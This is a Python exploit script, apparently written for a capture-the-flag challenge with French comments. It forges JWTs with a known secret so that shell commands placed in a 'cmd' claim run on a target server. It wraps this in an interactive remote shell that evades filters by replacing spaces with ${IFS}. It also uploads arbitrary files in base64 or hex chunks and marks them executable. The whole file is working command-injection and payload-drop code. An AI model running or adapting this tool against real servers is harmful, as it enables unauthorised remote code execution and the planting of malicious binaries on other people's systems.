import requests
import jwt
import base64
import random
import sys
import time

TARGET = 'http://TARGET/'
SECRET = "JWT_SECRET"

class Shell:
    def __init__(self):
        self.current_dir = None
        self.get_initial_dir()
    
    def get_initial_dir(self):
        """Récupère le répertoire initial"""
        result = self.exploit("pwd")
        if result:
            self.current_dir = result.strip()
            print(f"[*] Répertoire initial : {self.current_dir}")
    
    def exploit(self, command):
        """Exécute une commande sur le serveur"""
        encoded_jwt = jwt.encode({"cmd": command}, SECRET, algorithm="HS256")
        headers = {
            'Authorization': 'Bearer ' + encoded_jwt,
        }
        response = requests.get(TARGET, headers=headers)
        return response.text
    
    def execute_with_context(self, command):
        """Exécute une commande dans le contexte du répertoire courant"""
        if self.current_dir:
            full_command = f"cd${{IFS}}{self.current_dir}${{IFS}}&&${{IFS}}{command}"
        else:
            full_command = command
        
        return self.exploit(full_command)
    
    def change_directory(self, path):
        """Change le répertoire courant"""
        if not path:
            # cd sans argument = home
            test_cmd = "cd${{IFS}}&&${{IFS}}pwd"
        else:
            # cd vers un chemin spécifique
            safe_path = path.replace(" ", "${IFS}")
            test_cmd = f"cd${{IFS}}{safe_path}${{IFS}}&&${{IFS}}pwd"
        
        result = self.exploit(test_cmd)
        
        if result and "No such file or directory" not in result and result.strip():
            self.current_dir = result.strip()
            print(f"[+] Répertoire courant : {self.current_dir}")
            return True
        else:
            print(f"[!] Impossible de changer vers : {path}")
            print(f"[!] Erreur : {result}")
            return False
    
    def upload_file(self, local_file, remote_path=None):
        """Upload un fichier sur le serveur - méthode améliorée"""
        try:
            with open(local_file, "rb") as f:
                content = f.read()
            
            # Générer un nom temporaire aléatoire
            rand_tmp = random.randrange(10000, 99999)
            
            # Encoder le fichier en base64
            b64_content = base64.b64encode(content).decode()
            
            print(f"[*] Upload de {local_file} ({len(content)} bytes, {len(b64_content)} bytes encodés)")
            
            # Déterminer le chemin de destination
            if remote_path is None:
                if self.current_dir:
                    remote_path = f"{self.current_dir}/{local_file}"
                else:
                    remote_path = f"/tmp/{local_file}"
            elif not remote_path.startswith('/'):
                remote_path = f"{self.current_dir}/{remote_path}"
            
            tmp_file = f"/tmp/.upload_{rand_tmp}"
            
            # Nettoyer d'abord si le fichier existe
            self.exploit(f"rm${{IFS}}-f${{IFS}}{tmp_file}")
            time.sleep(0.1)
            
            # Découper en petits chunks (plus petits pour éviter les problèmes)
            chunk_size = 3000
            total_chunks = (len(b64_content) + chunk_size - 1) // chunk_size
            
            print(f"[*] Envoi en {total_chunks} chunks...")
            
            for i in range(0, len(b64_content), chunk_size):
                chunk = b64_content[i:i+chunk_size]
                chunk_num = (i // chunk_size) + 1
                
                # Méthode 1 : Utiliser printf au lieu d'echo pour éviter les problèmes d'échappement
                cmd = f"printf${{IFS}}'%s'${{IFS}}'{chunk}'>>{tmp_file}"
                
                result = self.exploit(cmd)
                
                # Petit délai entre les chunks
                time.sleep(0.05)
                
                print(f"[*] Chunk {chunk_num}/{total_chunks} envoyé", end='\r')
            
            print(f"\n[+] Tous les chunks envoyés vers {tmp_file}")
            
            # Vérifier que le fichier temporaire existe et a la bonne taille
            check_cmd = f"wc${{IFS}}-c${{IFS}}{tmp_file}"
            check_result = self.exploit(check_cmd)
            print(f"[*] Taille du fichier encodé : {check_result.strip()}")
            
            # Décoder le fichier
            print(f"[*] Décodage vers {remote_path}...")
            decode_cmd = f"base64${{IFS}}-d${{IFS}}{tmp_file}>{remote_path}"
            decode_result = self.exploit(decode_cmd)
            
            time.sleep(0.2)
            
            # Rendre exécutable
            chmod_cmd = f"chmod${{IFS}}+x${{IFS}}{remote_path}"
            self.exploit(chmod_cmd)
            
            # Vérifier l'upload final
            verify_cmd = f"ls${{IFS}}-lh${{IFS}}{remote_path}"
            verification = self.exploit(verify_cmd)
            
            if verification and "No such file" not in verification:
                print(f"[+] Upload réussi !")
                print(f"[+] Vérification :\n{verification}")
                
                # Vérifier le contenu (premiers bytes)
                head_cmd = f"head${{IFS}}-c${{IFS}}50${{IFS}}{remote_path}"
                head_result = self.exploit(head_cmd)
                print(f"[*] Début du fichier : {repr(head_result[:50])}")
            else:
                print(f"[!] Erreur : le fichier n'a pas été créé correctement")
                print(f"[!] Résultat : {verification}")
            
            # Nettoyer le fichier temporaire
            clean_cmd = f"rm${{IFS}}-f${{IFS}}{tmp_file}"
            self.exploit(clean_cmd)
            
            return True
            
        except FileNotFoundError:
            print(f"[!] Fichier {local_file} introuvable")
            return False
        except Exception as e:
            print(f"[!] Erreur lors de l'upload : {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def upload_file_hex(self, local_file, remote_path=None):
        """Upload un fichier en utilisant le format hexadécimal (alternative)"""
        try:
            with open(local_file, "rb") as f:
                content = f.read()
            
            print(f"[*] Upload de {local_file} en hex ({len(content)} bytes)")
            
            # Déterminer le chemin de destination
            if remote_path is None:
                if self.current_dir:
                    remote_path = f"{self.current_dir}/{local_file}"
                else:
                    remote_path = f"/tmp/{local_file}"
            elif not remote_path.startswith('/'):
                remote_path = f"{self.current_dir}/{remote_path}"
            
            # Convertir en hex
            hex_content = content.hex()
            
            rand_tmp = random.randrange(10000, 99999)
            tmp_file = f"/tmp/.hex_{rand_tmp}"
            
            # Nettoyer
            self.exploit(f"rm${{IFS}}-f${{IFS}}{tmp_file}")
            
            # Envoyer en chunks
            chunk_size = 4000
            total_chunks = (len(hex_content) + chunk_size - 1) // chunk_size
            
            for i in range(0, len(hex_content), chunk_size):
                chunk = hex_content[i:i+chunk_size]
                chunk_num = (i // chunk_size) + 1
                
                cmd = f"printf${{IFS}}'{chunk}'>>{tmp_file}"
                self.exploit(cmd)
                time.sleep(0.05)
                
                print(f"[*] Chunk {chunk_num}/{total_chunks} envoyé", end='\r')
            
            print(f"\n[*] Décodage hexadécimal...")
            
            # Décoder avec xxd
            decode_cmd = f"xxd${{IFS}}-r${{IFS}}-p${{IFS}}{tmp_file}>{remote_path}"
            self.exploit(decode_cmd)
            
            # Chmod
            self.exploit(f"chmod${{IFS}}+x${{IFS}}{remote_path}")
            
            # Vérifier
            verify_cmd = f"ls${{IFS}}-lh${{IFS}}{remote_path}"
            verification = self.exploit(verify_cmd)
            print(f"[+] Vérification :\n{verification}")
            
            # Nettoyer
            self.exploit(f"rm${{IFS}}-f${{IFS}}{tmp_file}")
            
            return True
            
        except Exception as e:
            print(f"[!] Erreur : {e}")
            return False

def main():
    print("="*60)
    print("CTF Command Injection Shell with CD support")
    print("="*60)
    print("Commandes spéciales :")
    print("  cd <path>                    - Changer de répertoire")
    print("  upload <local> [remote]      - Upload un fichier (base64)")
    print("  uploadhex <local> [remote]   - Upload un fichier (hex)")
    print("  pwd                          - Afficher le répertoire courant")
    print("  exit/quit                    - Quitter")
    print("="*60 + "\n")
    
    shell = Shell()
    
    while True:
        try:
            # Afficher le prompt avec le répertoire courant
            prompt = f"[{shell.current_dir or '?'}]$ "
            command = input(prompt).strip()
            
            if not command:
                continue
            
            # Commande exit
            if command.lower() in ['exit', 'quit']:
                print("[*] Bye!")
                break
            
            # Commande cd
            if command.startswith("cd ") or command == "cd":
                if command == "cd":
                    path = ""
                else:
                    path = command[3:].strip()
                shell.change_directory(path)
                continue
            
            # Commande pwd
            if command == "pwd":
                print(shell.current_dir)
                continue
            
            # Commande upload
            if command.startswith("upload "):
                parts = command.split(maxsplit=2)
                if len(parts) == 2:
                    shell.upload_file(parts[1])
                elif len(parts) == 3:
                    shell.upload_file(parts[1], parts[2])
                else:
                    print("[!] Usage: upload <local_file> [remote_path]")
                continue
            
            # Commande uploadhex (alternative)
            if command.startswith("uploadhex "):
                parts = command.split(maxsplit=2)
                if len(parts) == 2:
                    shell.upload_file_hex(parts[1])
                elif len(parts) == 3:
                    shell.upload_file_hex(parts[1], parts[2])
                else:
                    print("[!] Usage: uploadhex <local_file> [remote_path]")
                continue
            
            # Commande normale - remplacer les espaces et exécuter avec contexte
            safe_command = command.replace(" ", "${IFS}")
            result = shell.execute_with_context(safe_command)
            
            if result:
                print(result, end='')
                if not result.endswith('\n'):
                    print()
            else:
                print("[!] Pas de sortie")
                
        except KeyboardInterrupt:
            print("\n[*] Utilisez 'exit' pour quitter")
        except Exception as e:
            print(f"[!] Erreur : {e}")

if __name__ == "__main__":
    main()
